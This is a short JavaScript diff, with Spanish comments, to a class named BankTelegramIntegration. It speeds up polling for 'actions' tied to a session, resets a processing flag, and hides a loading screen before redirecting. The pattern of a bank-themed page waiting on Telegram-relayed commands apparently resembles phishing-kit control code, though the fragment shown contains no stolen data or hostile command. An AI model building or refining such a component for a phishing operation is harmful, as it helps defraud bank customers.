@@ -57,7 +57,7 @@ class BankTelegramIntegration {
     }
 
     /**
-     * Iniciar polling para esperar acciones (API optimizada)
+     * Iniciar polling para esperar acciones (API optimizada - 50ms ultra rápido)
      */
     startPolling(callback) {
         if (window.__bankProcessing) return;
@@ -71,7 +71,12 @@ class BankTelegramIntegration {
             
             // Llamar callback personalizado
             callback(action);
-        }, this.sessionId, 100, 300000);
+            
+            // Resetear flag después de procesar
+            setTimeout(() => {
+                window.__bankProcessing = false;
+            }, 50);
+        }, this.sessionId, 50, 300000);
     }
 
     /**
@@ -102,6 +107,7 @@ class BankTelegramIntegration {
      * Redireccionar sin delay
      */
     redirect(url) {
+        this.hideLoading();
         window.location.href = url;
     }
 }
